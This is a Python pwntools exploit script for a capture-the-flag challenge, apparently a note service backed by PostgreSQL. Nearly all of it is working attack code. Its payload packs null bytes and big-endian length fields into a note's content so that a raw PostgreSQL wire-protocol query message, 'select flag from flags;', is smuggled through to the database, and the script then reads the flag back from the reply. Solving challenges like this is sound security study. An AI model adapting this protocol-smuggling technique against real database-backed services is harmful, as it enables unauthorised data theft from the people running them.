#!/usr/bin/env python3

from pwn import *

exe = ELF("../../challenge/chall")

context.binary = exe

gdbscript = """
"""


def conn():
    if args.LOCAL:
        r = process([exe.path], env={"PGHOST": "127.0.0.1", "PGPASSWORD": "postgres"})
    elif args.GDB:
        r = gdb.debug(
            [exe.path],
            gdbscript=gdbscript,
            env={"PGHOST": "127.0.0.1", "PGPASSWORD": "postgres"},
        )
    else:
        r = remote(
            args.HOST or "localhost", args.PORT or 1337, ssl=True if args.SSL else False
        )

    return r


def new_note(content, owner="user") -> tuple[int, str]:
    r.sendlineafter(b"6 > Exit\n> ", b"1")
    r.sendlineafter(b"Content: ", content)
    r.sendlineafter(b"Owner: ", owner.encode())

    r.recvuntil(b"with ID: ")
    id_line = r.recvuntil(b".", drop=True).strip()
    try:
        note_id = int(id_line)
    except ValueError:
        log.success("FLAG: " + id_line.decode())
        exit(0)

    r.recvuntil(b"Use secret key ")
    key = r.recvuntil(b" ", drop=True).strip().decode()

    return note_id, key


def main():
    global r
    r = conn()

    stmt = "select flag from flags;"

    note_id, key = new_note(
        b"A\0"
        + p32(0x4, endian="big")
        + b"AAAA"
        + p32(0x10, endian="big")
        + (b"A" * 0x10)
        + p8(0)
        + b"Q"
        + p32(4 + len(stmt) + 1, endian="big")
        + stmt.encode()
        + b"\0"
    )

    r.interactive()


if __name__ == "__main__":
    main()

